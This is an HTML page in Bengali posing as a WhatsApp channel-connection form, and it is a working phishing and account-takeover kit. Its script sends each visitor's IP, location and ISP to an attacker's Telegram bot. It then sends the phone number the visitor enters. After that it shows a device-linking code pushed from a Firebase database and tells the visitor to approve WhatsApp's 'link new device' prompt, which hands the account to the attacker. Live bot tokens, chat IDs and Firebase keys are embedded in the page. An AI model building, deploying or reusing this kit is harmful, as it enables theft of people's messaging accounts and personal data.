<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Your whatsapp account</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kalpurush:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
    <style>
        body { font-family: 'Kalpurush', sans-serif; background: linear-gradient(135deg, #128C7E, #075E54); color: #333; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 1rem; }
        .container { max-width: 400px; width: 100%; background-color: #ECE5DD; border-radius: 1.5rem; padding: 2.5rem 2rem; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }
        .whatsapp-logo i { font-size: 80px; color: #25D366; background: white; border-radius: 50%; padding: 20px; box-shadow: 0 5px 20px rgba(37, 211, 102, 0.4); }
        .input-field { background-color: #fff; border: 2px solid #ddd; border-radius: 0.75rem; padding: 0.85rem 1rem; text-align: center; font-size: 1.1rem; width: 100%; transition: all 0.3s ease; }
        .input-field:focus { outline: none; border-color: #25D366; }
        .btn { background: linear-gradient(90deg, #25D366, #128C7E); color: white; font-weight: bold; padding: 0.9rem; border-radius: 0.75rem; width: 100%; border: none; cursor: pointer; transition: all 0.3s ease; }
        .loader { border: 6px solid #ccc; border-top: 6px solid #128C7E; border-radius: 50%; width: 60px; height: 60px; animation: spin 1.5s linear infinite; margin: 2rem auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .pin-display { display: flex; justify-content: center; gap: 5px; margin-bottom: 1.5rem; }
        .pin-digit { width: 38px; height: 48px; display: flex; justify-content: center; align-items: center; font-size: 1.5rem; font-weight: bold; background-color: #fff; border: 2px solid #128C7E; color: #075E54; border-radius: 0.5rem; }
        .instruction-list { list-style: none; padding: 0; text-align: left; }
        .instruction-list li { display: flex; align-items: flex-start; margin-bottom: 0.75rem; font-size: 1rem; }
        .step-icon { color: #128C7E; margin-right: 0.75rem; margin-top: 4px; width: 20px; text-align: center; }
    </style>
</head>
<body>

<div class="container">
    <div id="page1" class="text-center">
        <div class="whatsapp-logo mb-5"><i class="fab fa-whatsapp"></i></div>
        <h1 class="text-3xl font-bold text-gray-800 mb-2">‡¶π‡ßã‡ßü‡¶æ‡¶ü‡¶∏‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™ ‡¶ö‡ßç‡¶Ø‡¶æ‡¶®‡ßá‡¶≤ ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</h1>
        <p class="text-gray-600 mb-8">Add ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ WhatsApp ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶¶‡¶ø‡¶®</p>
        <form id="phoneForm" class="space-y-5">
            <input type="tel" id="phoneNumber" placeholder="‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶π‡ßã‡ßü‡¶æ‡¶ü‡¶∏‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™ ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶≤‡¶ø‡¶ñ‡ßÅ‡¶®" required class="input-field">
            <button type="submit" class="btn"><i class="fab fa-whatsapp mr-2"></i>continue</button>
        </form>
    </div>
    
    <!-- Loading Time Updated -->
    <div id="loading" class="hidden text-center">
        <div class="loader"></div>
        <p class="text-lg text-gray-700 font-semibold">‡¶∏‡¶Ç‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá...</p>
        <p class="text-gray-500">‡¶Ö‡¶®‡ßÅ‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡ßá ‡ß®‡ß¶ ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶° ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§</p>
    </div>
    
    <!-- Page 2 Updated with new text -->
    <div id="page2" class="hidden text-center">
        <i class="fa fa-circle-info text-5xl text-teal-800 mb-4"></i>
        <h1 class="text-2xl font-bold text-gray-800 mb-3">‡¶π‡ßã‡ßü‡¶æ‡¶ü‡¶∏‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™ ‡¶ö‡ßç‡¶Ø‡¶æ‡¶®‡ßá‡¶≤‡ßá ‡¶Ø‡ßÅ‡¶ï‡ßç‡¶§ ‡¶π‡¶ì‡ßü‡¶æ‡¶∞ ‡¶®‡¶ø‡¶∞‡ßç‡¶¶‡ßá‡¶∂‡¶®‡¶æ</h1>
    
        <p class="text-gray-600 mb-2">‡¶®‡ßÅ‡¶∏‡¶∞‡¶æ‡¶§ ‡¶è‡¶∞ ‡ßÆ-‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ‡¶∞ ‡¶π‡ßã‡ßü‡¶æ‡¶ü‡¶∏‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™ ‡¶Ü‡¶®‡¶≤‡¶ï ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞</p>
        <div id="pinContainer" class="pin-display">
            <span class="pin-digit"></span><span class="pin-digit"></span><span class="pin-digit"></span><span class="pin-digit"></span>
            <span class="pin-digit"></span><span class="pin-digit"></span><span class="pin-digit"></span><span class="pin-digit"></span>
        </div>

        <div class="bg-white p-4 rounded-lg shadow-inner text-gray-700">
            <h2 class="text-lg font-semibold mb-3 border-b pb-2">‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶´‡ßã‡¶®‡ßá ‡¶Ü‡¶®‡¶≤‡¶ï ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶™‡ßç‡¶∞‡¶¨‡ßá‡¶∂ ‡¶ï‡¶∞‡¶æ‡¶®:</h2>
            <ul class="instruction-list">
                <li><i class="fa fa-mobile-screen-button step-icon"></i>‡¶™‡ßç‡¶∞‡¶•‡¶Æ‡ßá ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶´‡ßã‡¶®‡ßá‡¶∞ ‡¶®‡ßã‡¶ü‡¶ø‡¶´‡¶ø‡¶ï‡ßá‡¶∂‡¶® ‡¶•‡ßá‡¶ï‡ßá <strong>"Enter code to link new device"</strong> ‡¶è ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶®‡•§</li>
                <li><i class="fa fa-check-to-slot step-icon"></i>‡¶è‡¶∞‡¶™‡¶∞ <strong>Confirm</strong> ‡¶¨‡¶æ‡¶ü‡¶®‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶®‡•§</li>
                <li><i class="fa fa-fingerprint step-icon"></i>‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶´‡ßã‡¶®‡ßá‡¶∞ ‡¶´‡¶ø‡¶ô‡ßç‡¶ó‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶ø‡¶®‡ßç‡¶ü ‡¶Ö‡¶•‡¶¨‡¶æ ‡¶™‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶∞‡ßç‡¶® ‡¶≤‡¶ï ‡¶¶‡¶ø‡ßü‡ßá ‡¶Ü‡¶®‡¶≤‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶®‡•§</li>
                <li><i class="fa fa-keyboard step-icon"></i>‡¶∏‡¶¨‡¶∂‡ßá‡¶∑‡ßá, ‡¶´‡¶æ‡¶Å‡¶ï‡¶æ ‡ßÆ‡¶ü‡¶ø ‡¶¨‡¶ï‡ßç‡¶∏‡ßá ‡¶â‡¶™‡¶∞‡ßá ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã ‡¶Ü‡¶®‡¶≤‡¶ï ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶ü‡¶ø ‡¶¨‡¶∏‡¶æ‡¶® ‡¶è‡¶¨‡¶Ç ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§</li>
            </ul>
        </div>
        
        <p class="text-xs text-gray-500 mt-4">‡¶¶‡ßç‡¶∞‡¶∑‡ßç‡¶ü‡¶¨‡ßç‡¶Ø: ‡¶®‡¶ø‡¶∞‡¶æ‡¶™‡¶§‡ßç‡¶§‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶è‡¶á ‡¶Ü‡¶®‡¶≤‡¶ï ‡¶®‡¶æ‡¶Æ‡ßç‡¶¨‡¶æ‡¶∞ ‡¶ü‡¶ø ‡¶™‡ßç‡¶∞‡¶§‡¶ø ‡ßß ‡¶Æ‡¶ø‡¶®‡¶ø‡¶ü ‡¶™‡¶∞ ‡¶™‡¶∞ ‡¶∏‡ßç‡¶¨‡¶Ø‡¶º‡¶Ç‡¶ï‡ßç‡¶∞‡¶ø‡¶Ø‡¶º‡¶≠‡¶æ‡¶¨‡ßá ‡¶™‡¶∞‡¶ø‡¶¨‡¶∞‡ßç‡¶§‡¶® ‡¶π‡¶¨‡ßá‡•§</p>
    </div>
</div>

<!-- Firebase and Telegram Script Section -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<script>
    // --- Configuration Section ---
    const firebaseConfig = {
      apiKey: "AIzaSyA--EbKHCyRtTp4AgBZua22Ad2J7JRbS28",
      authDomain: "control-my-page.firebaseapp.com",
      databaseURL: "https://control-my-page-default-rtdb.firebaseio.com",
      projectId: "control-my-page",
      storageBucket: "control-my-page.appspot.com",
      messagingSenderId: "846756179295",
      appId: "1:846756179295:web:f5eec02565c2f2d45c5aea",
      measurementId: "G-37RH0B37KK"
    };

    const TELEGRAM_BOT_TOKEN = "7974529959:AAFAxgBkj-V6iF-Vd827VgP1wc-uzOQzNco"; "8522129049:AAHZalnaH5g1evquwhwL1PmZjiasK9ZpAdI";
    const CHAT_ID = "6658445342"; "6904677396";
    const API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    // --- Firebase Initialization ---
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // --- DOM Elements ---
    const page1 = document.getElementById('page1');
    const loading = document.getElementById('loading');
    const page2 = document.getElementById('page2');
    const phoneForm = document.getElementById('phoneForm');
    const phoneNumberInput = document.getElementById('phoneNumber');
    const pinDigits = document.querySelectorAll('#pinContainer .pin-digit');

    // --- Functions ---
    async function sendTelegramMessage(text) {
        try {
            await fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
            });
        } catch (error) { console.error("Telegram message failed:", error); }
    }
    
    async function getVisitorInfoAndNotify() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            const message = `
*üë§ ‡¶®‡¶§‡ßÅ‡¶® ‡¶≠‡¶ø‡¶ú‡¶ø‡¶ü‡¶∞!*
-------------------------
*IP:* \`${data.ip}\`
*‡¶¶‡ßá‡¶∂:* ${data.country_name}
*‡¶∂‡¶π‡¶∞:* ${data.city}
*ISP:* ${data.org}
-------------------------`;
            await sendTelegramMessage(message);
        } catch (error) {
            await sendTelegramMessage("üë§ ‡¶è‡¶ï‡¶ú‡¶® ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶π‡ßã‡ßü‡¶æ‡¶ü‡¶∏‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™ ‡¶™‡ßá‡¶ú ‡¶≠‡¶ø‡¶ú‡¶ø‡¶ü ‡¶ï‡¶∞‡ßá‡¶õ‡ßá (‡¶¨‡¶ø‡¶∏‡ßç‡¶§‡¶æ‡¶∞‡¶ø‡¶§ ‡¶™‡¶æ‡¶ì‡ßü‡¶æ ‡¶Ø‡¶æ‡ßü‡¶®‡¶ø)‡•§");
        }
    }
    
    function listenForCodeChanges() {
        const liveCodeRef = database.ref('liveCode');
        liveCodeRef.on('value', (snapshot) => {
            const data = snapshot.val();
            const code = data ? data.code : "        "; 
            for (let i = 0; i < 8; i++) {
                pinDigits[i].textContent = code[i] || ' ';
            }
        });
    }

    // --- Event Listeners ---
    window.addEventListener('load', () => {
        getVisitorInfoAndNotify();
    });

    phoneForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const phoneNumber = phoneNumberInput.value;
        if (!phoneNumber) return;
        
        await sendTelegramMessage(`*üì± ‡¶™‡ßç‡¶∞‡¶æ‡¶™‡ßç‡¶§ ‡¶π‡ßã‡ßü‡¶æ‡¶ü‡¶∏‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™ ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞:*\n\`${phoneNumber}\``);
        
        page1.classList.add('hidden');
        loading.classList.remove('hidden');

        // Loading Time updated to 20 seconds
        setTimeout(() => {
            loading.classList.add('hidden');
            page2.classList.remove('hidden');
            listenForCodeChanges();
        }, 20000); 
    });
</script>

</body>
</html>
